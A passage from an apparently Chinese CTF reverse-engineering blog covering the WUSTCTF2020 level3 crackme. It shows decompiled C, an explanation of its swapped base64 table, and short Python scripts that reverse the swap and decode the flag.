class="number">0x0C</span>,<span class="number">0x02</span>,<span class="number">0x69</span>]</span><br><span class="line"></span><br><span class="line">arr1 = []</span><br><span class="line">v4 = <span class="number">4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr2)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    arr1.append(arr2[i] ^ v4)</span><br><span class="line">    v4 = arr1[-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr2)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">	<span class="built_in">print</span> (<span class="built_in">chr</span>(arr1[i]),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="WUSTCTF2020-level3"><a href="#WUSTCTF2020-level3" class="headerlink" title="[WUSTCTF2020]level3"></a>[WUSTCTF2020]level3</h2><p>base64置换表更改的</p>
<p>main</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+Fh] [rbp-41h]</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">56</span>]; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Try my base64 program?.....\n&gt;&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%20s&quot;</span>, v6);</span><br><span class="line">  v5 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v5);</span><br><span class="line">  <span class="keyword">if</span> ( (rand() &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (<span class="keyword">const</span> <span class="keyword">char</span> *)base64_encode(v6);</span><br><span class="line">    <span class="built_in">puts</span>(v3);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Is there something wrong?&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Sorry I think it&#x27;s not prepared yet....&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And I get a strange string from my program which is different from the standard base64:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s wrong??&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看见密文在最后面，我们发了个骚东西O_OLookAtYou</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">O_OLookAtYou</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [rsp+1h] [rbp-5h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+2h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = base64_table[i];</span><br><span class="line">    base64_table[i] = base64_table[<span class="number">19</span> - i];</span><br><span class="line">    result = <span class="number">19</span> - i;</span><br><span class="line">    base64_table[result] = v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数就是对置换表进行魔改的，用人话表示就是这样的</p>
<p>table[i],table[19-i]=table[19-i],table[i]</p>
<p>置换得到正常的表后就可以进行骚操作</p>
<p>Python永远滴神吹爆</p>
<p>maketrans()方法的作用就是起到自定义字符串替换的效果，这样就省去了脚本寻找的代码编写时间</p>
<h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">table = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span></span><br><span class="line">model = <span class="built_in">list</span>(<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>)</span><br><span class="line">s = <span class="string">&quot;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    model[i], model[<span class="number">19</span>-i] = model[<span class="number">19</span>-i], model[i]</span><br><span class="line"></span><br><span class="line">model = <span class="string">&#x27;&#x27;</span>.join(model)</span><br><span class="line"></span><br><span class="line">table = <span class="built_in">str</span>.maketrans(model, table)</span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(s.translate(table)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
</search>
